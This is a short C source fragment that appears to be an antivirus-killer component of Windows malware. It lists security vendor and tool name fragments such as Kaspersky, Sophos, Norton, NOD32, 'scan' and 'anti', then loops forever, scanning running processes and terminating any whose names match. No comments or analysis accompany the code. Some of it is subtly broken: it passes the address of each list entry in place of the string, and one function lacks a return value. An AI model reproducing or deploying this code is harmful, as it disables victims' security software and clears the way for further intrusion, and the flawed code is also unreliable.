const char *Blacklist[] = {"av","Av","AV","defend","Defend","DEFEND","f-","F-","defense","Defense","DEFENSE",
"Kaspersky","KASPERSKY","kaspersky","sophos","SOPHOS","Sophos","Scanner","SCANNER","scanner","Norton","norton",
"NORTON","Security","SECURITY","security","Anti","ANTI","anti","SCAN","Scan","scan","Malware","MALWARE","malware",
"Virus","VIRUS","virus","NOD32","nod32","Nod32","Zoner","ZONER","zoner","SECUR","Secur","secur","Dr.","DR.",0};

int NoAntiVirus_fun(char *av_string);
int NoAntiVirus(void)
{
	int c;
	while(1) {
		for(c=0;Blacklist[c]!=0;c++) NoAntiVirus_fun((char *)&Blacklist[c]);
		Sleep(5000);
	}
	return 0;
}

int NoAntiVirus_fun(char *av_string)
{
	HANDLE hSnapshot, pHandle;
	PROCESSENTRY32 pe32;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	Process32First(hSnapshot,&pe32);
	pHandle = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pe32.th32ProcessID);
	if(strstr(pe32.szExeFile,av_string)!=NULL) TerminateProcess(pHandle,0);
	CloseHandle(pHandle);

	while(Process32Next(hSnapshot,&pe32) == TRUE) {
		pHandle = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pe32.th32ProcessID);
		if(strstr(pe32.szExeFile,av_string)!=NULL) TerminateProcess(pHandle,0);
		CloseHandle(pHandle);
	}
}
